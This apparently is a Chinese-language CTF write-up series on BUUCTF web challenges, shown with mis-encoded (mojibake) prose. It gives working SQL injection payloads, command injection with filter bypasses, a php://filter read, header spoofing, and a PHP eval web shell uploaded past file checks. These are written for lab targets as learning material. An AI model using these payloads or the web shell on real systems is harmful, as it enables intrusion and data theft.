ğŸ”ºSQLæ³¨å…¥+ä¸‰ç§å§¿åŠ¿\n\nå¯ä»¥å…ˆç”¨å•å¼•å·åˆ¤æ–­æ˜¯å¦å­˜åœ¨SQLæ³¨å…¥\n\n```\n/index.php?inject=1'\n```\n\nå‡ºç°å¦‚ä¸‹ï¼Œå‡ºé”™åˆ™ä»£è¡¨å­˜åœ¨\n\n![image-20220107125314983](https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201071253029.png)\n\né‚£ä¹ˆå…ˆæŸ¥è¯¢å­˜åœ¨çš„è¡¨\n\n```\n/index.php?inject=';show tables;#\n```\n\nå‘ç°æœ‰å¦‚ä¸‹ä¸¤ä¸ªè¡¨\n\n![image-20220107162320203](https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201071623241.png)\n\nç„¶ååˆ†åˆ«æŸ¥çœ‹ä¸€ä¸‹å¯¹åº”çš„\n\n```\n/index.php?inject=';show columns from words;#\n```\n\n![image-20220107162923778](https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201071629819.png)\n\n```\n/index.php?inject=';show columns from `1919810931114514`;#\n```\n\n![image-20220107162957623](https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201071629659.png)\n\né‚£ä¹ˆflagå°±åœ¨è¡¨1919810931114514ä¸­ï¼Œæ³¨æ„æŸ¥è¯¢æ•°å­—è¡¨çš„æ—¶å€™éœ€è¦åŠ **åå¼•å·`**\n\n## è§£æwordsè¡¨\n\né‚£ä¹ˆç”±äºè¾“å…¥1ï¼Œ2ä¼šå‡ºç°å¦‚ä¸‹æ•°æ®\n\n![image-20220107164211829](https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201071642873.png)\n\n![image-20220107164221323](https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201071642355.png)\n\nè¿™é‡Œçš„ç¬¬äºŒä¸ªæ•°æ®æ®µæ˜¯å­—ç¬¦å‹ï¼Œé‚£ä¹ˆå°±åº”è¯¥æ˜¯åœ¨è¡¨wordsä¸­ï¼Œæ­¤æ—¶å°±å¤§æ¦‚æ˜¯å¦‚ä¸‹çš„è¡¨æ ¼\n\n| id   | data         |\n| ---- | ------------ |\n| 1    | hahahah      |\n| 2    | miaomiaomiao |\n\n## è§£æ`1919810931114514`è¡¨\n\nä¾æ®åˆ—å¤§æ¦‚çŒœæµ‹å¦‚ä¸‹\n\n| flag            |\n| --------------- |\n| ...........ä¸çŸ¥ |\n\nè¿™é‡Œselectè¢«è¿‡æ»¤äº†ï¼Œæ— æ³•ç›´æ¥ä»è¡¨1919810931114514ä¸­è·å–æ‰€ä»¥å°è¯•ä¸€ä¸‹å…¶ä»–çš„è§£æ³•ã€‚\n\n\n\n## 1.è§£æ³•ä¸€(æ”¹è¡¨)\n\nä¿®æ”¹è¡¨åå­—ï¼Œä½¿å¾—ä¿å­˜flagçš„è¡¨1919810931114514åå­—å˜ä¸ºè¡¨wordsï¼Œä¹‹åæŠŠflagå­—æ®µå˜ä¸ºdataå­—æ®µï¼Œæ·»åŠ idå­—æ®µï¼Œè¾“å…¥1,2ç„¶åå°±å¯ä»¥æ‰“å°å‡ºflagäº†ã€‚\n\n### (1)æ”¹å\n\n```\n/index.php?inject=1'; rename table words to word1; rename table `1919810931114514` to words;#\n```\n\n### (2)å¢æ·»idå­—æ®µ\n\n```\n/index.php?inject=1'; alter table words add id int unsigned not Null auto_increment primary key;#\n```\n\n### (3)ä¿®æ”¹flagä¸ºdataå­—æ®µ\n\n```\n/index.php?inject=1';alert table words change flag data varchar(100);#\n```\n\n### æ€»çš„payload\n\n```\n/index.php?inject=1'; rename table words to word1; rename table `1919810931114514` to words;alter table words add id int unsigned not Null auto_increment primary key;alert table words change flag data varchar(100);#\n```\n\næœ€åè¾“å…¥1æäº¤å³å¯\n\n\n\n## 2.è§£æ³•äºŒ(openå’Œhandler)\n\nåˆ©ç”¨openå’Œhandleå…³é”®å­—\n\n```\n/index.php?inject='; handler `1919810931114514` open as `a`; handler `a` read next;#\n```\n\nè¿™æ ·å¯ä»¥ç›´æ¥è¯»å‡ºæ¥è¡¨`1919810931114514`çš„æ‰€æœ‰å†…å®¹\n\n![image-20220107171100441](https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201071711484.png)\n\n\n\n## 3.è§£æ³•ä¸‰(MySQLçš„é¢„å¤„ç†)\n\nåˆ©ç”¨é¢„å¤„ç†æœºåˆ¶prepareå’Œconcatæ‹¼æ¥è·å¾—selectæ“ä½œï¼Œä¹‹åexecuteæ¥æ‰§è¡Œï¼Œè¿™é‡Œå¥½åƒä¸èƒ½å°å†™ï¼Œå¯ä»¥é€šè¿‡å¤§å†™æ¥ç»•è¿‡\n\n```\n/index.php?inject=';PREPARE st from concat('s','elect', ' * from `1919810931114514` \n');EXECUTE st;#\n```\n\n![image-20220107171702374](https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201071717419.png)\n\n\n\n\n\n# å…­ã€[SUCTF 2019]EasySQL\n\næ¶‰åŠçŸ¥è¯†ç‚¹æœ‰ç‚¹å¤š\n\n\n\n# ä¸ƒã€[ACTF2020 æ–°ç”Ÿèµ›]Exec\n\n## ğŸ”ºå‘½ä»¤æ‰§è¡Œ+å¯»æ‰¾flag\n\n## 1.è¿œç¨‹å‘½ä»¤æ‰§è¡Œ\n\nä¸€èˆ¬è¿™ç§pingçš„ç•Œé¢ï¼Œéƒ½å¯èƒ½ä¼šæ¶‰åŠåˆ°å‘½ä»¤æ‰§è¡Œ\n\n![image-20220109120351450](https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201091203487.png)\n\né‚£ä¹ˆç›´æ¥å°è¯•ä¸€ä¸‹å³å¯ï¼Œpingä¸€ä¸‹æœ¬åœ°å›ç¯åœ°å€\n\nè¾“å…¥\n\n```\n127.0.0.1;pwd\n```\n\n![image-20220109120428320](https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201091204354.png)\n\nå¯ä»¥çœ‹åˆ°å­˜åœ¨è¿œç¨‹å‘½ä»¤æ‰§è¡Œï¼Œé‚£ä¹ˆå°±å°è¯•æ‰¾flagåœ¨å“ªï¼Œä¹Ÿå°±æ˜¯ä¸€ä¸ªè·¯å¾„æœç´¢ã€‚\n\n## 2.æœç´¢flagè·¯å¾„\n\nè¾“å…¥\n\n```\n127.0.0.1;ls\n```\n\n![image-20220109120604954](https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201091206984.png)\n\né‚£ä¹ˆå»æ ¹ç›®å½•æ‰¾\n\nè¾“å…¥\n\n```\n127.0.0.1;ls /\n```\n\n![image-20220109120649283](https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201091206321.png)\n\nå¯ä»¥çœ‹åˆ°flagï¼Œé‚£ä¹ˆç›´æ¥catå³å¯\n\n```\n127.0.0.1;cat /flag\n```\n\nå¾—åˆ°flag\n\n![image-20220109120742963](https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201091207995.png)\n\n\n\n# å…«ã€[æå®¢å¤§æŒ‘æˆ˜ 2019]Secret File\n\n## ğŸ”ºæŠ“åŒ…+ä¼ªåè®®\n\n## 1.å‰æœŸæ¢ç´¢\n\næŸ¥çœ‹æºä»£ç ï¼Œæœ‰å¦‚ä¸‹æ–‡ä»¶ï¼Œè®¿é—®ä¸€ä¸‹\n\n![image-20220109121055447](https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201091210479.png)\n\næ¥ç€æŒ‰ç…§æç¤ºï¼Œä½†æ˜¯ç›´æ¥è·³è½¬åˆ°äº†\n\n![image-20220109121144475](https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201091211532.png)\n\né‚£ä¹ˆä¸­é—´å¯èƒ½æ‰§è¡Œå¤ªå¿«ï¼Œè¿™æ—¶å€™å°±éœ€è¦æŠ“åŒ…æ¥çœ‹çœ‹å…·ä½“æ˜¯æ€ä¹ˆæ‰§è¡Œçš„ã€‚\n\n## 2.æŠ“åŒ…\n\nç”¨BurpSuitæŠ“åŒ…ï¼Œå‘ç°æœ‰ä¸€ä¸ªaction.phpï¼Œé‡Œé¢æœ‰ä¸ªsecr3t.phpçš„æç¤º\n\n![image-20220109183459387](https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201091834445.png)\n\nè®¿é—®ä¸€ä¸‹secr3t.php\n\n![image-20220109183542434](https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201091835473.png)\n\næç¤ºæ”¾åœ¨äº†flag.phpï¼Œè®¿é—®ä¹‹åå‘ç°ä»€ä¹ˆä¹Ÿæ²¡æœ‰\n\n![image-20220109183616033](https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201091836077.png)\n\né‚£ä¹ˆè¿™é‡Œç”±äºsecr3t.phpå­˜åœ¨fileçš„åè®®ï¼Œæ‰€ä»¥å¯ä»¥å°è¯•ä½¿ç”¨phpä¼ªåè®®è·å–flag.phpçš„æºä»£ç \n\n```\n/secr3t.php?file=php://filter/read=convert.base64-encode/resource=flag.php\n```\n\n![image-20220109183730031](https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201091837080.png)\n\næ‹¿åˆ°CyberChefè§£å¯†ï¼Œå¾—åˆ°flag\n\n![image-20220109183825033](https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201091838079.png)\n\n\n\n\n\n# ä¹ã€[æå®¢å¤§æŒ‘æˆ˜ 2019]LoveSQL\n\n\n\n\n\n\n\n# åã€[GXYCTF2019]Ping Ping Ping\n\n## ğŸ”ºå‘½ä»¤æ‰§è¡Œ\n\n## 1.å‰æœŸæ¢ç´¢\n\nPingæç¤º+ipï¼Œåº”è¯¥æ˜¯å‘½ä»¤æ‰§è¡Œï¼Œç›´æ¥lsè¯•è¯•\n\n```\n/?ip=127.0.0.1;ls\n```\n\n![image-20220110200315404](https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201102003467.png)\n\nå‘ç°flagï¼Œå°è¯•cat\n\n```\n/?ip=127.0.0.1;cat flag.php\n```\n\n![image-20220110200415489](https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201102004540.png)\n\n## 2.ç»•è¿‡è¿‡æ»¤\n\nåº”è¯¥æ˜¯è¿‡æ»¤çš„ç©ºæ ¼\n\nâ–²ç»•è¿‡ç©ºæ ¼ï¼šä¸€èˆ¬æ€è·¯å¦‚ä¸‹\n\n```\n$IFS\n${IFS}\n$IFS$1 //å…¶ä¸­é‚£ä¸ª1åŠ å…¶ä»–çš„åº”è¯¥éƒ½è¡Œ\n<\n<>\n{cat,flag.php}\n$20\n$09(ç©ºå­—ç¬¦)\n```\n\nå‚è€ƒ[[GXYCTF2019\\]Ping Ping Ping - æ˜¥å‘Šé³¥ - åšå®¢å›­ (cnblogs.com)](https://www.cnblogs.com/Cl0ud/p/12313368.html)\n\nä½¿ç”¨`$IFS`å¯ä»¥ï¼Œä½†æ˜¯åˆå‘ç°è¿‡æ»¤äº†flag\n\n![image-20220110202147216](https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201102021256.png)\n\né‚£ä¹ˆæ¥ä¸‹çš„è§£æ³•å°±å¤šç§å¤šæ ·äº†ã€‚\n\n### è§£æ³•ä¸€ï¼šæ‹¼æ¥flag\n\n```\n/index.php?ip=127.0.0.1;b=ag.php;a=fl;cat$IFS$1$a$b\n```\n\nflagåœ¨æ³¨é‡Šé‡Œï¼ŒæŸ¥çœ‹ç½‘é¡µæºä»£ç å³å¯\n\n![image-20220111112715736](https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201111127902.png)\n\n### è§£æ³•äºŒï¼šshç»“åˆbase64\n\n#### â–²linuxè‡ªå¸¦base64å’Œbase32\n\nç”±äºlinuxçš„shè‡ªå¸¦base64çš„åŠ è§£å¯†ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥ä¼ å…¥base64çš„å¯†æ–‡ï¼Œç„¶ååˆ©ç”¨linuxçš„shç»ˆç«¯è‡ªå¸¦çš„base64è§£å¯†åŠŸèƒ½è¿›è¡Œè§£å¯†ï¼Œè¿™æ ·å¯ä»¥åœ¨ä¸€å®šç¨‹åº¦ä¸Šç»•è¿‡å¾ˆå¤šè¿‡æ»¤ï¼Œå¦å¤–base32ä¹Ÿå¯ä»¥\n\n#### (1)base64åŠ å¯†\n\nä½¿ç”¨CyberChefæˆ–è€…linuxå‘½ä»¤è¡Œéƒ½è¡Œ\n\n![image-20220111113614306](https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201111136396.png)\n\n![image-20220111113634402](https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201111136522.png)\n\n#### (2)base64è§£å¯†\n\n```\necho Y2F0IGZsYWcucGhwCg== | base64 -d | sh\n```\n\nå°†ä¹‹å‰åŠ å¯†çš„\"cat flag.php\"ä¼ ç»™base64è§£å¯†ï¼Œç„¶åshæ‰§è¡Œ\n\nå¯¹åº”å†™åœ¨URLä¸Šå³ä¸º\n\n```\n/index.php?ip=127.0.0.1;echo$IFS$9Y2F0IGZsYWcucGhwCg==$IFS$9|$IFS$9base64$IFS$9-d$IFS$9|$IFS$9sh\n```\n\n### è§£æ³•ä¸‰ï¼šlinuxå†…è”æ‰§è¡Œ\n\nå‘½ä»¤ä¸­ä¼šå…ˆæ‰§è¡Œåå¼•å·é‡Œçš„ï¼Œç„¶åå°†è¾“å…¥ç»“æœä¾æ¬¡ä¼ é€’ç»™å…¶ä»–å‘½ä»¤è¿›è¡Œæ‰§è¡Œ\n\nç”±äºflagå°±åœ¨å½“å‰æ–‡ä»¶å¤¹ä¸‹ï¼Œæ‰€ä»¥\n\n```bash\ncat `ls`;\n#å…ˆæ‰§è¡Œlsè¾“å‡º index.php å’Œ flag.phpï¼Œä¹‹åå°†è¾“å…¥ç»“æœç»™åˆ°catå‘½ä»¤ï¼Œç›¸å½“äºå†æ‰§è¡Œ cat index.php;cat flag.php\n```\n\nå¯¹åº”URLä¸º\n\n```\n/index.php?ip=127.0.0.1;cat$IFS$9`ls`\n```\n\n## â–²å…¶ä»–\n\næ­¤å¤–å‘½ä»¤æ‰§è¡Œæœ‰å¾ˆå¤šæ–¹æ³•å¯ä»¥ç»•è¿‡ï¼Œè¿™é‡Œbanæ‰äº†å¾ˆå¤šï¼Œåƒ`<`ï¼Œ`\\`ç­‰éƒ½æ˜¯æœ‰å¯èƒ½\n\n[å‘½ä»¤æ‰§è¡Œç»•è¿‡çš„æ–¹æ³• - GLCC - åšå®¢å›­ (cnblogs.com)](https://www.cnblogs.com/GLory-LTF/p/15359485.html)\n\n\n\n# åä¸€ã€[æå®¢å¤§æŒ‘æˆ˜ 2019]Knife\n\n## ğŸ”ºä¸€å¥è¯æœ¨é©¬\n\nä¾æ®æç¤ºä»¥åŠå¦‚ä¸‹çš„è¯­å¥ï¼ŒçŒœæµ‹æ˜¯ä¸€å¥è¯æœ¨é©¬ï¼Œå¯†ç ä¸ºSyc\n\n![image-20220111144925504](https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201111449555.png)\n\nä½¿ç”¨èšå‰‘è¿æ¥\n\nèšå‰‘æ•™ç¨‹ï¼š[è·å–èšå‰‘ Â· è¯­é›€ (yuque.com)](https://www.yuque.com/antswordproject/antsword/srruro)\n\nç„¶åç›´æ¥å¤åˆ¶URLè¿›è¡Œè¿æ¥å³å¯ï¼Œå³é”®->æ·»åŠ æ•°æ®\n\n![image-20220111145119474](https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201111451527.png)\n\nè¿›å»ä¹‹åè¿›å…¥æ ¹ç›®å½•å¯»æ‰¾flag\n\n![image-20220111145143729](https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201111451771.png)\n\n![image-20220111145208831](https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201111452893.png)\n\n\n\n\n\n# åäºŒã€[æå®¢å¤§æŒ‘æˆ˜ 2019]Http\n\n## ğŸ”ºä½¿ç”¨BurpSuitæ”¹åŒ…å¤´\n\n## 1.å‰æœŸæ¢ç´¢\n\nç›´æ¥æºä»£ç ï¼Œæœç´¢.phpï¼Œå‘ç°ä¸€ä¸ªSecrect.php\n\n![image-20220111141159974](https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201111412036.png)\n\nç„¶åè®¿é—®ï¼Œå‘ç°éœ€è¦ä»https://Sycsecret.buuoj.cnè®¿é—®æ‰è¡Œ\n\n![image-20220111141218518](https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201111412596.png)\n\né‚£ä¹ˆå°±ä½¿ç”¨BurpSuiteè¿›è¡Œä¿®æ”¹\n\n## 2.BurpSuiteä½¿ç”¨æ”¹åŒ…\n\né¦–å…ˆæµè§ˆå™¨å¼€å¯ä»£ç†ï¼ŒBurpSuiteæŠ“åˆ°åŒ…\n\n![image-20220111141339457](https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201111413501.png)\n\nç„¶åå°†åŒ…å‘é€åˆ°`repeater`\n\n![image-20220111141424655](https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201111414701.png)\n\nåœ¨Repeateræœ€æ–°å‡ºç°çš„ä¸€éƒ¨åˆ†å°±æ˜¯\n\n![image-20220111141531436](https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201111415489.png)\n\n### (1)ä¿®æ”¹Referer\n\nç”±äºè¯´è¦ä»https://Sycsecret.buuoj.cnè®¿é—®ï¼Œæ‰€ä»¥æ·»åŠ å¦‚ä¸‹ï¼Œåœ¨Getä¸‹æ·»åŠ \n\n```\nReferer: https://Sycsecret.buuoj.cn\n```\n\n![image-20220111141726767](https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201111417813.png)\n\nç‚¹å‡»GoæŒ‰é’®å‘é€åŒ…\n\n![image-20220111141823417](https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201111418470.png)\n\nè¿”å›çš„åŒ…æç¤ºä¸è¡Œï¼Œé‚£ä¹ˆéœ€è¦ä¿®æ”¹æµè§ˆå™¨åç§°\n\n![image-20220111141837951](https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201111418007.png)\n\n### (2)ä¿®æ”¹User-Agent\n\nä¿®æ”¹å¦‚ä¸‹\n\n```\nUser-Agent: Syclover\n```\n\n![image-20220111142004093](https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201111420138.png)\n\nè¿˜æ˜¯ä¸è¡Œï¼Œæç¤ºéœ€è¦ä»æœ¬åœ°localè¯»å–\n\n![image-20220111142051767](https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201111420811.png)\n\n### (3)ä¿®æ”¹X-Forwarded-For\n\næ·»åŠ å¦‚ä¸‹\n\n```\nX-Forwarded-For: 127.0.0.1\n```\n\n![image-20220111142201689](https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201111422737.png)\n\nå‘é€åå¾—åˆ°flag\n\n![image-20220111142221310](https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201111422352.png)\n\n\n\n\n\n# åä¸‰ã€[æå®¢å¤§æŒ‘æˆ˜ 2019]Upload\n\n## ğŸ”ºæ–‡ä»¶ä¸Šä¼ æ¼æ´ã€ä¸€å¥è¯æœ¨é©¬\n\n## 1.å‰æœŸæ¢ç´¢\n\nè¿›å…¥ä¹‹åå‘ç°è®©é€‰æ‹©å›¾ç‰‡è¿›è¡Œä¸Šä¼ ï¼Œé‚£ä¹ˆå°±è€ƒè™‘ä¸€å¥è¯æœ¨é©¬çš„éšå†™ï¼Œç„¶åå†ä¸Šä¼ \n\né¦–å…ˆå°è¯•ä¸Šä¼ .phpæ–‡ä»¶ï¼Œå¤±è´¥ï¼Œæ¥ç€è€ƒè™‘æµ‹ç»•è¿‡ã€‚\n\n## 2.ç»•è¿‡è¿‡æ»¤\n\n### (1)ä¿®æ”¹Content-Type\n\n![image-20220112120212319](https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201121202373.png)\n\nå¤±è´¥ï¼Œåç¼€åä¸èƒ½ä¸º.php\n\n![image-20220112120239252](https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201121202287.png)\n\n### (2)ä¿®æ”¹åç¼€å\n\nä¿®æ”¹ä¸ºphtmlï¼Œè¿™ç§æ ¼å¼åœ¨æœåŠ¡å™¨ä¹Ÿä¼šè¢«ä½œä¸ºphpæ–‡ä»¶è§£æã€‚\n\n![image-20220112120451143](https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201121204190.png)\n\næˆåŠŸï¼Œä½†æ˜¯ä¸èƒ½æ˜¯`<?`å¼€å¤´ï¼Œé‚£ä¹ˆå°è¯•ä½¿ç”¨htmlæ ¼å¼ã€‚è¿˜æœ‰çš„phpæ–‡ä»¶åç¼€åå¯ä»¥ä¿®æ”¹å¦‚ä¸‹\n\n```\n- åˆ©ç”¨ä¸­é—´ä»¶è§£ææ¼æ´ç»•è¿‡æ£€æŸ¥ï¼Œå®æˆ˜å¸¸ç”¨\n- ä¸Šä¼ .user.iniæˆ–.htaccesså°†åˆæ³•æ‹“å±•åæ–‡ä»¶å½“ä½œphpæ–‡ä»¶è§£æ\n- %00æˆªæ–­ç»•è¿‡\n- php3æ–‡ä»¶\n- php4æ–‡ä»¶\n- php5æ–‡ä»¶\n- php7æ–‡ä»¶\n- phtmlæ–‡ä»¶\n- phpsæ–‡ä»¶\n- phtæ–‡ä»¶\n```\n\n[[BUUOJè®°å½•\\] [ACTF2020 æ–°ç”Ÿèµ›]Upload - Ye'sBlog - åšå®¢å›­ (cnblogs.com)](https://www.cnblogs.com/yesec/p/12403922.html)\n\n\n\n### (3)ä¿®æ”¹phpæ ¼å¼\n\nä¿®æ”¹å†…å®¹ä¸º\n\n```\n<script language=\"php\">eval($_POST['shell']);</script>\n```\n\n![image-20220112120616999](https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201121206053.png)\n\næˆåŠŸï¼Œä½†æ˜¯ä¹Ÿè¢«æ¢æµ‹åˆ°ï¼Œé‚£ä¹ˆå°è¯•ä¿®æ”¹æ–‡ä»¶å¤´éƒ¨æ ¼å¼\n\n![image-20220112120712009](https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201121207056.png)\n\n### (4)å°è¯•ä¿®æ”¹æ–‡ä»¶å¤´éƒ¨\n\nåœ¨æ–‡ä»¶å¤´åŠ ä¸Š`GIF89a`\n\n![image-20220112121007758](https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201121210799.png)\n\nä¸Šä¼ æˆåŠŸ\n\n![image-20220112121056862](https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201121210905.png)\n\n## 3.æŸ¥æ‰¾ä¸Šä¼ æ–‡ä»¶è·¯å¾„\n\nä¸€èˆ¬è€Œè¨€ï¼Œä¸Šä¼ çš„éƒ½åœ¨uploadï¼ŒæˆåŠŸæ‰¾åˆ°\n\n![image-20220112121305153](https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201121213219.png)\n\né‚£ä¹ˆèšå‰‘è¿æ¥ï¼Œæ ¹ç›®å½•ä¸‹æ‰¾åˆ°flag\n\n![image-20220112121815697](https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201121218740.png)\n\n# åå››ã€[ACTF2020 æ–°ç”Ÿèµ›]Upload\n\nå’Œåä¸‰é¢˜ä¸€æ ·ï¼Œç›´æ¥ä¸€å¥è¯æœ¨é©¬ï¼Œæ–‡ä»¶æ ¼å¼ä¸ºphtmlï¼Œä¿®æ”¹content-typeå³å¯ï¼Œç„¶åèšå‰‘è¿ä¸Šåœ¨æ ¹ç›®å½•ä¸‹æ‰¾flagã€‚éœ€è¦æ³¨æ„çš„æ˜¯è¦å…ˆä¸Šä¼ æˆåŠŸä¸€ä¸ªæ–‡ä»¶æ‰ä¼šæŠ“åˆ°ä¸Šä¼ çš„åŒ…ï¼Œå› ä¸ºè¿™é‡Œçš„éªŒè¯æ˜¯åœ¨å‰ç«¯éªŒè¯åç¼€åçš„ã€‚\n\n\n\n# åäº”ã€[RoarCTF 2019]Easy Calc\n\n## ğŸ”ºå‘½ä»¤æ‰§è¡Œã€phpå­—ç¬¦ä¸²è§£æã€HTTPèµ°ç§æ”»å‡»\n\n## 1.å‰æœŸæ¢ç´¢\n\næŸ¥çœ‹æºä»£ç ï¼Œå‘ç°å¦‚ä¸‹.phpæ–‡ä»¶\n\n![image-20220112190657868](https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201121906058.png)\n\nè®¿é—®ä¸€ä¸‹ï¼Œå‘ç°æºä»£ç ï¼Œåˆ†æè¿‡æ»¤äº†ä¸€äº›ä¸œè¥¿ï¼Œç„¶åæˆ‘ä»¬è¾“å…¥çš„numå­—ç¬¦ä¸²è¿›è¡Œè§£æï¼Œå¹¶ä¸”ä½¿ç”¨evalæ‰§è¡Œåè¾“å‡º\n\n![image-20220112191231694](https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201121912749.png)\n\nä¸»è¦ä»¥ä¸‹ä»£ç ï¼Œè¿‡æ»¤äº†å¾ˆå¤šä¸œè¥¿ï¼Œç„¶åæ‰§è¡Œè¾“å‡º\n\n```php\n$str = $_GET['num'];\n$blacklist = [' ', '\\t', '\\r', '\\n','\\'', '\"', '`', '\\[', '\\]','\\$','\\\\','\\^'];\neval('echo '.$str.';')\n```\n\nå°è¯•phpinfo()ï¼Œå‘ç°ç›´æ¥æŠ¥é”™ï¼Œå¤§ä½¬ä»¬è¯´æ˜¯Wafçš„åŸå› ï¼Œå…·ä½“ä¹Ÿä¸å¤ªçŸ¥é“æ€ä¹ˆåˆ¤æ–­å‡ºWafçš„ï¼Œç»è¿‡æµ‹è¯•ï¼Œè¿™é‡Œçš„wafä¼šè¿‡æ»¤æ‰æ‰€æœ‰å¸¦å­—æ¯çš„numå˜é‡å†…å®¹ã€‚\n\n![image-20220113115855930](https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201131203691.png)\n\næ‰€ä»¥å¤§æ¦‚æœ‰ä¸¤ç§æ–¹æ³•\n\n## 2.è§£å†³æ–¹æ³•\n\n### è§£æ³•ä¸€ï¼šåˆ©ç”¨phpå­—ç¬¦ä¸²è§£æç‰¹æ€§ç»•è¿‡WAF\n\n#### (1)ç»•è¿‡WAF\n\nåˆ©ç”¨phpè§£æå­—ç¬¦ä¸²æ—¶ï¼Œä¼šè‡ªåŠ¨å»æ‰å¤šä½™çš„ç©ºæ ¼è¿™ä¸ªç‰¹æ€§ï¼Œå³å½“æˆ‘ä»¬è°ƒè¯•æ—¶\n\nè¾“å…¥ä¸­é—´åŠ å…¥äº†ç©ºæ ¼çš„numï¼Œå‘ç°phpä¾ç„¶èƒ½å¤ŸæˆåŠŸè§£æå‡ºnumè¿™ä¸ªå˜é‡\n\n```\nhttp://127.0.0.1/index.php?%20num=phpinfo()\n```\n\n![image-20220113115626996](https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201131156038.png)\n\n![image-20220113115655830](https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201131156886.png)\n\nä½†æ˜¯WAFå¯ä¸ä¼šç®¡ç©ºä¸ç©ºæ ¼çš„ï¼Œå¯¹äºWafæ¥è¯´ï¼Œä¼ è¿‡å»çš„æ˜¯å¸¦äº†ç©ºæ ¼çš„numå˜é‡ï¼Œä¸æ˜¯numå˜é‡ï¼Œæ‰€ä»¥ä¸ä¼šè¿›è¡Œè¿‡æ»¤ï¼Œä¼šå°†å¸¦äº†ç©ºæ ¼çš„numå˜é‡ä¼ é€’ç»™calc.phpæ–‡ä»¶è¿›è¡Œè§£æï¼Œè¿™æ ·å°±æˆåŠŸç»•è¿‡äº†WAFã€‚\n\n#### (2)ç»•è¿‡è¿‡æ»¤\n\nç”±äºè¿‡æ»¤äº†`/`ï¼Œæ‰€ä»¥è¿™é‡Œä½¿ç”¨`chr(47)`æ¥è¿›è¡Œç»•è¿‡ï¼Œè¿™æ˜¯`/`å­—ç¬¦çš„asciiç \n\nå…ˆæŸ¥çœ‹æ ¹ç›®å½•ä¸‹æœ‰ä»€ä¹ˆå†…å®¹\n\n```\n/calc.php?%20num=var_dump(scandir(chr(47)))\n```\n\nå‘ç°æœ‰flag\n\n![image-20220113121152229](https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201131211277.png)\n\né‚£ä¹ˆåˆ©ç”¨phpä¸­çš„å‡½æ•°è¿›è¡Œè·å–\n\n```\n/calc.php?%20num=file_get_contents(chr(47).chr(102).chr(49).chr(97).chr(103).chr(103))\n```\n\nå¾—åˆ°flag\n\n![image-20220113121256750](https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201131212797.png)\n\n### è§£æ³•äºŒï¼šåˆ©ç”¨HTTPèµ°ç§æ”»å‡»\n\nè¿™ä¸ªå…·ä½“çš„åŸç†å®åœ¨æ˜¯æœ‰ç‚¹ä¸å¤ªèƒ½ç†è§£ï¼Œå¯èƒ½éœ€è¦æ·±å…¥ç ”ç©¶ä¸€ä¸‹ã€‚ä»¥æˆ‘çš„ç†è§£æ¥è¯´ï¼Œå°±æ˜¯é€šè¿‡ä¿®æ”¹`content-length`æˆ–è€…`Transfer-Encoding`ï¼Œæ¥ä½¿å¾—æ•°æ®åŒ…åœ¨å‰åç«¯è§£æçš„è¿‡ç¨‹ä¸­ï¼Œè®©å‰ç«¯ä»¥ä¸ºè¯¥æ•°æ®åŒ…çš„å†…å®¹æ¯”è¾ƒå°‘ï¼Œä½¿å…¶è®¤ä¸ºä¸åŒ…å«éœ€è¦è¿‡æ»¤çš„å†…å®¹ï¼Œä»è€ŒæŠŠå®Œæ•´çš„æ•°æ®åŒ…å‘ç»™åç«¯ï¼Œç»•è¿‡å‰ç«¯çš„Wafç­‰è¿‡æ»¤ã€‚\n\nBurpSuitæŠ“åŒ…ä¹‹åï¼Œä¿®æ”¹`content-length`æˆ–è€…`Transfer-Encoding`\n\n\n\n#### 